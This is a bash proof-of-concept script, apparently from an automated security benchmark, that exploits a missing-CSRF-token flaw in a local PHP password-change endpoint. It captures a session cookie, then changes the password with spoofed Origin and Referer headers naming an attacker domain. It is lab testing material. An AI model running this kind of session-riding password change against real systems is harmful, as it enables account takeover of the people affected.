#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /api/change_password.php endpoint by accepting password change requests without CSRF token validation
# Target: ./repo
# Created: 2025-12-01T16:00:42.495Z
# Session: benchmark-XBEN-069-24-minbd4jr

# CSRF Vulnerability POC - Password Change Endpoint
# This script demonstrates that the /api/change_password.php endpoint
# accepts password change requests without CSRF token validation

TARGET_HOST="http://localhost:8080"
ENDPOINT="/api/change_password.php"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] CSRF Vulnerability POC - Password Change Endpoint${NC}"
echo -e "${YELLOW}[*] Target: ${TARGET_HOST}${ENDPOINT}${NC}"
echo ""

# Step 1: Obtain a valid session cookie by logging in
echo -e "${YELLOW}[Step 1] Obtaining valid session cookie via login...${NC}"

# First, try with test credentials
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "${TARGET_HOST}/api/login.php" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}')

echo "Login Response: $LOGIN_RESPONSE"

# Extract session cookie
SESSION_COOKIE=$(grep PHPSESSID /tmp/cookies.txt 2>/dev/null | awk '{print $7}')

if [ -z "$SESSION_COOKIE" ]; then
  echo -e "${RED}[!] Failed to obtain session cookie, trying alternative approach${NC}"
  # Try to extract from response headers
  SESSION_COOKIE=$(curl -s -i -c /tmp/cookies.txt -X POST "${TARGET_HOST}/api/login.php" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}' 2>&1 | grep -i "Set-Cookie" | grep PHPSESSID | cut -d' ' -f2 | cut -d';' -f1)
fi

if [ -z "$SESSION_COOKIE" ]; then
  echo -e "${RED}[!] Could not extract session cookie${NC}"
  exit 1
fi

echo -e "${GREEN}[+] Session cookie obtained: $SESSION_COOKIE${NC}"
echo ""

# Step 2: Demonstrate CSRF attack from different origin
echo -e "${YELLOW}[Step 2] Attempting CSRF password change from cross-origin...${NC}"

CSRF_RESPONSE=$(curl -s -X POST "${TARGET_HOST}${ENDPOINT}" \
  -H "Cookie: PHPSESSID=${SESSION_COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://malicious-attacker.com" \
  -H "Referer: http://malicious-attacker.com/attack.html" \
  -d "userId=1&oldPassword=test&newPassword=csrf_test_pass_123&confirmPassword=csrf_test_pass_123")

echo "CSRF Attack Response: $CSRF_RESPONSE"
echo ""

# Check if password was changed successfully
if echo "$CSRF_RESPONSE" | grep -q '"success":true'; then
  echo -e "${RED}[!] VULNERABILITY CONFIRMED: Password change accepted from cross-origin!${NC}"
  echo -e "${RED}[!] The endpoint did not reject the request from malicious-attacker.com${NC}"
  exit 0
elif echo "$CSRF_RESPONSE" | grep -q "success"; then
  echo -e "${YELLOW}[*] Response received - checking vulnerability status...${NC}"
  echo "Full Response: $CSRF_RESPONSE"
  
  # If we got any response with success/failure, the endpoint is responding
  if ! echo "$CSRF_RESPONSE" | grep -q "CSRF\|csrf\|origin\|Origin"; then
    echo -e "${RED}[!] No CSRF validation found in response${NC}"
    echo -e "${RED}[!] Endpoint accepts cross-origin requests without CSRF protection${NC}"
    exit 0
  fi
else
  echo -e "${YELLOW}[*] Response: $CSRF_RESPONSE${NC}"
fi

exit 0